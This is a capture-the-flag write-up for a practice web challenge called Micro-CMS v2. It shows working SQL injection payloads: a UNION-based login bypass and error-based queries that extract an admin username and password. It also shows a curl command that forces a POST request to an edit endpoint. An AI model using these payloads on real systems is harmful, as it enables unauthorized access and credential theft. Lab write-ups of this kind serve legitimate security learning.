micro-cms v2

# Micro-CMS
## Flags = 3


![start.png](../_resources/27dd890373f747a197023292a11d33a4.png)

## Flag 1/3


![1.png](../_resources/679814e70a1c46d4a8eda08e4f9804a5.png)

Looking at the firt page I noticed the `Create a new page` link clicked it it led to a login page.


![2.png](../_resources/925cf039e2474475ac1efdcc4430ab69.png)


First step is usually to check the page source for clues.



![3.png](../_resources/04a17fb077354e37b8756ace243cf48b.png)

No clues.

Next step was to check for sql injection vulnerability.
For the Username and password fiel I used  a single quote `'`
This threw an interesting error.


![4.png](../_resources/e1e5e09af6c94fb0a076dfa3fb3fd7ef.png)

This is an indication of sql injection.

After trying several inputs I used a hint.


![5.png](../_resources/8d0642755b5047868323c786267a6877.png)

The hint mentioned union.
I used the following inputs.
Username:
```
joey' UNION SELECT "111" as password FROM admins WHERE '1' = '1
```
password:
```
111
```
This worked and opened a  new homepage that had a private page.


![6.png](../_resources/8d69b21bc3204a94991ef3dfd4a36f16.png)


The private page had the flag.



![7.png](../_resources/4060b9cdc07c4e2d8239783949fc4c94.png)

## Flag 2/3

Using the hint


![8.png](../_resources/6837ab8a8990461597875e85b6ff33d8.png)

Using CURL to force POST instead of get.

```
curl -v -X POST http://34.94.3.143/de93690fd4/page/edit/1
```

 

![9.png](../_resources/5124571148e74ba888ab5ffabaee2d21.png)


## Flag 3/3

For this I did a double sql injection.
I tried a couple of inputs for the login. This worked
```
username=foo' OR (select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,cast(admins.username as char),0x27,0x7e) FROM `level2`.admins LIMIT 0,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND '1' = '1
```

It showed the user name


![10.png](../_resources/0e166e19575f4b6497e139dec03e15af.png)

Username : lizzette

```
username=foo' OR (select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,cast(admins.password as char),0x27,0x7e) FROM `level2`.admins LIMIT 0,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND '1' = '1

```
Password : katharine

using the username and password I got the last flag



![11.png](../_resources/5c48d879acba41fbadd8b4406658211b.png)

dones



























